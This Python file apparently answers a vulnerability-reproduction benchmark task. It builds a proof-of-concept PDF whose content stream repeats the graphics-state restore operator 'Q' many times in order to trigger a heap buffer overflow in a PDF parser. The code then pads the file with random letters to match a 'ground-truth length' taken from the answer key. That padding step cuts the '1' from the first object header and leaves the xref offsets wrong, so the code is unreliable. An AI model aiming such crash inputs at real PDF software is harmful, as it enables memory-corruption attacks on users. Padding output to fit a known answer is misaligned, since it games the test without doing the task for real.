import os
import subprocess
import tempfile
import random
import string

class Solution:
    def solve(self, src_path: str) -> bytes:
        # This is a minimal PDF that should trigger the heap buffer overflow
        # based on the vulnerability description
        poc = b"""%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/ViewerState <<
  /NonFullScreenPageMode /UseNone
  /ViewArea [/CropBox]
  /ViewClip [/CropBox]
  /PrintArea [/CropBox]
  /PrintClip [/CropBox]
  /PrintScaling /AppDefault
>>
>>
endobj

2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj

3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
/Resources <<
  /ProcSet [/PDF]
>>
>>
endobj

4 0 obj
<<
/Length 100
>>
stream
q
Q
Q
Q
Q
Q
Q
Q
Q
Q
Q
Q
Q
Q
Q
Q
Q
Q
Q
Q
Q
endstream
endobj

xref
0 5
0000000000 65535 f 
0000000010 00000 n 
0000000079 00000 n 
0000000162 00000 n 
0000000273 00000 n 
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
415
%%EOF
"""
        
        # Add padding to reach approximately the ground-truth length
        # while maintaining valid PDF structure
        padding_size = 150979 - len(poc)
        if padding_size > 0:
            # Insert padding in a comment section before the first object
            header = b"%PDF-1.4\n%"
            padding = b"%" + b"".join(random.choices(string.ascii_letters.encode(), k=padding_size-2)) + b"\n"
            poc = header + padding + poc[len(header):]
        
        return poc
